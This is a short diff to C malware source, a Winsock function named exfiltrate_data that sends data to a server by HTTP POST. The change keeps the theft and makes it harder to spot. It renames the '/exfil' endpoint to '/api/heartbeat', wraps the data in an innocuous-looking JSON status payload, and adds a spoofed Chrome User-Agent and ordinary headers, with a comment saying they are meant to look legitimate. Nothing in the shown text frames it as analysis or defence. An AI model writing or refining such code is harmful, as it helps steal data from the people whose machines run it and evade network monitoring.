@@ -12,16 +12,26 @@ void exfiltrate_data(const char *data) {
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
-    char message[2048], response[4096];
+    char message[4096], response[4096];
 
-    // Compose HTTP POST
-    sprintf(message,
-        "POST /exfil HTTP/1.1\r\n"
+    // Prepare JSON payload
+    char json_payload[LOG_BUFFER_SIZE + 64];
+    snprintf(json_payload, sizeof(json_payload),
+        "{\"status\":\"ok\",\"data\":\"%s\"}", data);
+
+    // Compose HTTP POST with legitimate-looking headers and endpoint
+    snprintf(message, sizeof(message),
+        "POST /api/heartbeat HTTP/1.1\r\n"
         "Host: %s\r\n"
-        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) "
+        "Chrome/122.0.0.0 Safari/537.36\r\n"
+        "Content-Type: application/json\r\n"
+        "Accept: application/json\r\n"
+        "Connection: keep-alive\r\n"
         "Content-Length: %d\r\n\r\n"
-        "data=%s",
-        SERVER, (int)(strlen(data) + 5), data);
+        "%s",
+        SERVER, (int)strlen(json_payload), json_payload);
 
     WSAStartup(MAKEWORD(2,2), &wsa);
     s = socket(AF_INET, SOCK_STREAM, 0);
